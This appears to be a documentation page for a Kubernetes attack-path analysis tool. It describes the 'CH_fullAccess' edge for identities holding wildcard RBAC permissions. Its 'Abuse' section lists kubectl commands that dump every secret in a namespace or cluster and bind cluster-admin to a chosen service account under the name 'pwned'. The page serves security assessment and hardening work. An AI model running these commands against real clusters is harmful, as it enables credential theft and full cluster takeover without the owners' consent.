# CH_fullAccess

## Edge Schema

- **Source:** [CH_Identity](../NodeDescriptions/CH_Identity.md)
- **Target:** [CH_Namespace](../NodeDescriptions/CH_Namespace.md) / [CH_Cluster](../NodeDescriptions/CH_Cluster.md)

## General Information

The Identity holds wildcard RBAC permissions (`*` verbs on `*` resources). If the permission is cluster-wide (via a ClusterRoleBinding), the edge points to the Cluster and all other RBAC edges for that identity are suppressed since they are already implied. If the permission is namespace-scoped (via a RoleBinding), the edge points to the affected Namespace and other RBAC edges targeting that same namespace are suppressed since they are already implied. Edges targeting other namespaces or the cluster are still emitted, as those permissions are not covered by this namespace-scoped `CH_fullAccess`.

## Abuse

Check the target node to understand the scope. A Cluster target means unrestricted access across the entire cluster. A Namespace target means unrestricted access within that namespace only, though this is still significant — all secrets, workloads, and service accounts in that namespace are accessible, and namespace-scoped privilege escalation paths (`CH_canBind`, `CH_canEscalate`) may apply.

```bash
# Confirm the exact scope of permissions
kubectl auth can-i --list
kubectl auth can-i --list -n <namespace>

# Read all secrets in scope
kubectl get secrets -A -o json          # cluster-wide
kubectl get secrets -n <namespace> -o json  # namespace-scoped

# Bind cluster-admin to a controlled service account (cluster-wide only)
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=<namespace>:<serviceaccount>
```

## References

- [Kubernetes RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [OWASP K02 - Overly Permissive RBAC Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)
